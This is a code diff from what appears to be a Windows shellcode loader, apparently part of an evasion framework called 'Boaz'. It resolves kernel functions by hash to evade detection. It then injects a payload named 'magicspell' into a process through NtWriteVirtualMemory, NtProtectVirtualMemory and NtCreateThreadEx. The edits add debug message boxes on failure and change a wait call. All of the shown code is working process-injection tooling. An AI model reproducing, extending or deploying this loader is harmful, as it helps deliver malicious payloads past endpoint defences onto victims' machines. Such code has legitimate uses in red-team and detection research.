@@ -30,7 +30,7 @@ FUNC VOID Main(
         if ( ! ( Instance()->Win32.LoadLibraryW = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryW" ) ) ) ) {
             return;
         }
-        if ( ! ( Instance()->Win32.WaitForSingleObjectEx = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) ) ) ) {
+        if ( ! ( Instance()->Win32.WaitForSingleObject = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObject" ) ) ) ) {
             return;
         }
         if ( ! ( Instance()->Win32.GetCurrentProcess = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "GetCurrentProcess" ) ) ) ) {
@@ -98,6 +98,8 @@ FUNC VOID Main(
     // if function successfully executed, open a message box:
     if (status == 0) {
         Instance()->Win32.MessageBoxW(NULL, L"VirtualAllocEx success", L"Boaz MessageBox", MB_OK);
+    } else {
+        Instance()->Win32.MessageBoxW(NULL, L"VirtualAllocEx failed", L"Boaz MessageBox", MB_OK);
     }
 
     // Instance()->Win32.RtlMoveMemory(magicspellAddress, magicspell, sizeof(magicspell));
@@ -106,6 +108,8 @@ FUNC VOID Main(
     status = Instance()->Win32.NtWriteVirtualMemory(hProcess, magicspellAddress, magicspell, magicspellSize, NULL);
     if(status == 0) {
         Instance()->Win32.MessageBoxW(NULL, L"NtWriteVirtualMemory success", L"Boaz MessageBox", MB_OK);
+    } else {
+        Instance()->Win32.MessageBoxW(NULL, L"NtWriteVirtualMemory failed", L"Boaz MessageBox", MB_OK);
     }
 
     DWORD oldProtect;
@@ -114,6 +118,8 @@ FUNC VOID Main(
     status = Instance()->Win32.NtProtectVirtualMemory(hProcess, &magicspellAddress, &magicspellSize, PAGE_EXECUTE_READ, &oldProtect);
     if(status == 0) {
         Instance()->Win32.MessageBoxW(NULL, L"NtProtectVirtualMemory success", L"Boaz MessageBox", MB_OK);
+    } else {
+        Instance()->Win32.MessageBoxW(NULL, L"NtProtectVirtualMemory failed", L"Boaz MessageBox", MB_OK);
     }
 
 
@@ -122,6 +128,9 @@ FUNC VOID Main(
     status = Instance()->Win32.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, magicspellAddress, NULL, FALSE, 0, 0, 0, NULL);
     if(status == 0) {
         Instance()->Win32.MessageBoxW(NULL, L"NtCreateThreadEx success", L"Boaz MessageBox", MB_OK);
+    } else 
+    {
+        Instance()->Win32.MessageBoxW(NULL, L"NtCreateThreadEx failed", L"Boaz MessageBox", MB_OK);
     }
 
 
@@ -132,10 +141,13 @@ FUNC VOID Main(
     // Instance()->Win32.TpReleaseWork( WorkReturn );
 
     // Waiting for 1 second to let the TpWorkCallback finish
-    BOOL result = Instance()->Win32.WaitForSingleObjectEx( hProcess, 6000, NULL );
+    BOOL result = Instance()->Win32.WaitForSingleObject( hThread, INFINITE );
     if(result == 0) {
         Instance()->Win32.MessageBoxW(NULL, L"WaitForSingleObjectEx success", L"Boaz MessageBox", MB_OK);
+    } else {
+        Instance()->Win32.MessageBoxW(NULL, L"WaitForSingleObjectEx failed", L"Boaz MessageBox", MB_OK);
     }
+
 
     // Message = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;
 
